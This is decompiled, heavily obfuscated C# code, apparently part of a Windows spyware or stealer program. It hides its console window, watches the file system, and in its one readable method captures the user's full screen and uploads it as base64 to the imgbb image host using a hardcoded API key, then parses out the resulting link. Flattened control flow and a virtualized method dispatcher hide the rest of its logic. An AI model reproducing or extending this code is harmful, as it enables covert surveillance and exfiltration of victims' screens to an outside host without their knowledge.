using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

internal class Class0
{
	private static FileSystemWatcher fileSystemWatcher_0;

	private static WebClient webClient_0;

	private static string string_0;

	private static string string_1;

	private static string string_2;

	private static string string_3;

	private static string string_4;

	private static string string_5;

	private static string FDA5B0A0;

	private static string string_6;

	private static string string_7;

	private static string string_8;

	private static string string_9;

	private static string string_10;

	private static string string_11;

	private static string string_12;

	private static string string_13;

	private static string string_14;

	private static bool bool_0;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool SetProcessDPIAware();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_0);

	private static void C8F7E37A(string string_15, string string_16 = "Debug")
	{
		object[] object_ = new object[2] { string_15, string_16 };
		new GClass22().method_112(object_, 819652);
	}

	[STAThread]
	private static void Main()
	{
		new GClass22().method_112(null, 833019);
	}

	private static void smethod_0(object sender, FileSystemEventArgs e)
	{
		object[] object_ = new object[2] { sender, e };
		new GClass22().method_112(object_, 691492);
	}

	private static void BA8AD1D3()
	{
		new GClass22().method_112(null, 851011);
	}

	private unsafe static string smethod_1()
	{
		uint num = 1452737118u;
		num = 1u;
		string text = "";
		try
		{
			Rectangle rectangle2;
			Bitmap val;
			do
			{
				num %= 166100029u;
				if (933704241 > num)
				{
					num ^= 0x516E755Bu;
					if (611600552u / num == 0)
					{
						C8F7E37A("Taking and uploading screenshot..", "Screenshot");
					}
				}
				num = 0x23EC42B2u & num;
				Screen object_ = Delegate46.smethod_0();
				num ^= 0x3B673871u;
				Rectangle rectangle = Delegate58.smethod_0(object_);
				num = 913145710 - num;
				rectangle2 = rectangle;
				int int_ = Delegate62.smethod_0(&rectangle2);
				Screen object_2 = Delegate46.smethod_0();
				num = 0x5ED46025u | num;
				Rectangle rectangle3 = Delegate58.smethod_0(object_2);
				num = 1630155622u / num;
				rectangle2 = rectangle3;
				num |= 0x60906518u;
				int int_2 = Delegate71.smethod_0(&rectangle2);
				num |= 0x3F547677u;
				val = (Bitmap)Delegate65.smethod_0(int_, int_2);
			}
			while (num < 897868244);
			Graphics val2 = Delegate142.smethod_0((Image)(object)val);
			try
			{
				num = 0x79AA5000u | num;
				num = 0x2C301C1Bu & num;
				int int_3 = (int)num + -741348379;
				uint int_4 = num ^ 0x2C30141B;
				uint int_5 = num - 741348379;
				uint int_6 = num ^ 0x2C30141B;
				num <<= 13;
				Screen object_3 = Delegate46.smethod_0();
				num = 2054448770u;
				Rectangle rectangle4 = Delegate58.smethod_0(object_3);
				num = 2121688818u;
				rectangle2 = rectangle4;
				num = 2963900066u;
				num = 0u;
				Delegate72.smethod_0(val2, int_3, (int)int_4, (int)int_5, (int)int_6, Delegate93.smethod_0(&rectangle2));
			}
			finally
			{
				num = 1375370673u;
				num = 4223016433u;
				num = 4159198531u;
				bool flag = val2 == null;
				num = 29789161u;
				while (true)
				{
					if (!flag)
					{
						num |= 0x25430AACu;
						if (1241193022 <= num)
						{
							continue;
						}
						num ^= 0x51527D6Au;
						((IDisposable)val2).Dispose();
						goto IL_0199;
					}
					goto IL_01b7;
					IL_01b7:
					if ((num ^ 0x63B53C05u) != 0)
					{
						break;
					}
					goto IL_0199;
					IL_0199:
					num %= 131532784u;
					if (90387904u / num == 0)
					{
						num ^= 0x7150C8Eu;
					}
					goto IL_01b7;
				}
			}
			num = 909649421u;
			ImageConverter val3 = (ImageConverter)Delegate156.smethod_0();
			string text4;
			do
			{
				object obj = Delegate87.smethod_0();
				num |= 0x5AD272C2u;
				NameValueCollection nameValueCollection = (NameValueCollection)obj;
				num = 1730176219u % num;
				num = 1477990127 * num;
				num = 0x6624427Au & num;
				num -= 1939670262;
				Type destinationType = Delegate118.smethod_0(typeof(byte[]).TypeHandle);
				num = 1332479521u % num;
				string text2 = Delegate106.smethod_0((byte[])((TypeConverter)(object)val3).ConvertTo((object?)val, destinationType));
				num /= 1333885850u;
				Delegate57.smethod_0(nameValueCollection, "image", text2);
				num &= 0x49AD09B5u;
				num &= 0x6BD8527Bu;
				NameValueCollection nameValueCollection_ = nameValueCollection;
				num = 417810937u >> (int)num;
				WebClient object_4 = webClient_0;
				num += 1454522664;
				num = 0x6AD259BBu | num;
				byte[] byte_ = Delegate146.smethod_0(object_4, "https://api.imgbb.com/1/upload?key=ce8348faabff9243c8aa26521ea10ae7", nameValueCollection_);
				Encoding object_5 = Delegate120.smethod_0();
				num = 0x4697723Cu & num;
				num = (uint)(177745550 << (int)num);
				string text3 = Delegate102.smethod_0(object_5, byte_);
				num %= 722294071u;
				text4 = text3;
			}
			while (num >= 969244192);
			string text5 = text4.Replace("\\/", "/");
			num = 2022117221 - num;
			text4 = text5;
			num = 873664036u % num;
			Regex regex = new Regex("(https?:\\/\\/[a-zA-Z0-9]+\\.[^\\s][^\"]{1,}[a-zA-Z0-9]+\\.png)");
			string input = text4;
			num = 0xF8C4820u & num;
			GroupCollection object_6 = Delegate135.smethod_0(regex.Match(input));
			num >>= 19;
			text = Delegate82.smethod_0(object_6, (int)(num ^ 0x80)).Value;
		}
		catch (Exception ex)
		{
			num = 1161585189u;
			Exception ex2 = ex;
			while (true)
			{
				num = 47869439u >> (int)num;
				if (num <= 462293205)
				{
					num = 1027284077 + num;
					goto IL_035f;
				}
				goto IL_0394;
				IL_035f:
				num += 776236209;
				text = "";
				if ((num ^ 0x5A791213) == 0)
				{
					continue;
				}
				string string_ = ex2.ToString();
				num /= 1758290771u;
				C8F7E37A(string_, "Screenshot");
				goto IL_0394;
				IL_0394:
				if (num != 1500401668 && 52441415 >= num)
				{
					break;
				}
				goto IL_035f;
			}
		}
		num = 93782709u;
		string result = text;
		num = 25427972u;
		return result;
	}

	private static void smethod_2()
	{
		new GClass22().method_112(null, 861544);
	}

	public static bool smethod_3()
	{
		return (bool)new GClass22().method_112(null, 852589);
	}

	private static string smethod_4()
	{
		return (string)new GClass22().method_112(null, 1551979);
	}

	private static void smethod_5()
	{
		new GClass22().method_112(null, 820348);
	}

	private static void AA1F98D4()
	{
		new GClass22().method_112(null, 699757);
	}

	private static string smethod_6()
	{
		return (string)new GClass22().method_112(null, 826859);
	}

	private static string smethod_7()
	{
		return (string)new GClass22().method_112(null, 704793);
	}

	private static string smethod_8()
	{
		return (string)new GClass22().method_112(null, 837380);
	}

	private static string smethod_9(string string_15)
	{
		object[] object_ = new object[1] { string_15 };
		return (string)new GClass22().method_112(object_, 820084);
	}

	private static string smethod_10()
	{
		return (string)new GClass22().method_112(null, 843996);
	}

	private static string[] smethod_11(string string_15)
	{
		object[] object_ = new object[1] { string_15 };
		return (string[])(Array)new GClass22().method_112(object_, 849423);
	}

	public Class0()
	{
		object[] object_ = new object[1] { this };
		new GClass22().method_112(object_, 821680);
	}

	static Class0()
	{
		new GClass22().method_112(null, 860364);
	}
}
